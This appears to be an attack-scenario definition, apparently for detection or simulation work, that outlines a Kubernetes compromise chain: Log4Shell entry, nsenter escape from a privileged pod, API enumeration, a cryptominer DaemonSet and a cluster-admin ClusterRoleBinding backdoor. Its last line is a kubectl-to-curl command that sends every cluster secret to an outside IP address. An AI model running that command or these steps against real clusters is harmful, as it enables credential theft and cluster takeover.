name: Kubernetes Container Escape to Node Compromise
description: A full container escape attack chain targeting a misconfigured Kubernetes cluster: initial access via a vulnerable container running as root, container escape via privileged pod/hostPID abuse, node-level persistence via crontab and DaemonSet backdoor, lateral movement to the Kubernetes API server, and cluster-wide persistence via ClusterRoleBinding creation.

phases.name: Initial Access via RCE in Containerized Application
phases.description: Attacker exploits a Log4Shell (CVE-2021-44228) vulnerability in a Java application running inside a Kubernetes pod. Remote code execution is achieved via JNDI LDAP callback to attacker-controlled server.

phases.name: Container Escape via Privileged Pod / hostPID
phases.description: The compromised pod runs as privileged with hostPID=true. The attacker uses nsenter to break out of the container namespace into the host OS, gaining root access to the Kubernetes node.

events: Privileged container exec with nsenter targeting PID 1

phases.name: Kubernetes API Server Enumeration
phases.description: With node access, the attacker reads the kubelet service account token and uses it to enumerate the Kubernetes API server: listing all pods, secrets, configmaps, and identifying RBAC misconfigurations.

phases.name: Cryptominer Deployment via DaemonSet
phases.description: Attacker deploys a cryptomining DaemonSet (XMRig) that runs on every node in the cluster. The DaemonSet uses privileged containers and host network access for maximum CPU utilization.

phases.name: Cluster Admin Persistence via ClusterRoleBinding
phases.description: Attacker creates a ClusterRoleBinding granting cluster-admin to a compromised service account, establishing persistence that survives pod restarts and node reboots.

events: Kubernetes audit: ClusterRoleBinding create from unexpected SA

phases.name: Secrets Exfiltration from Kubernetes Secrets/ConfigMaps
phases.description: All Kubernetes secrets (database passwords, API keys, TLS certificates, AWS credentials stored as secrets) are exfiltrated to the attacker's C2 server.

commands: kubectl get secrets -A -o json | curl -X POST http://45.33.32.156:8080/exfil -d @-
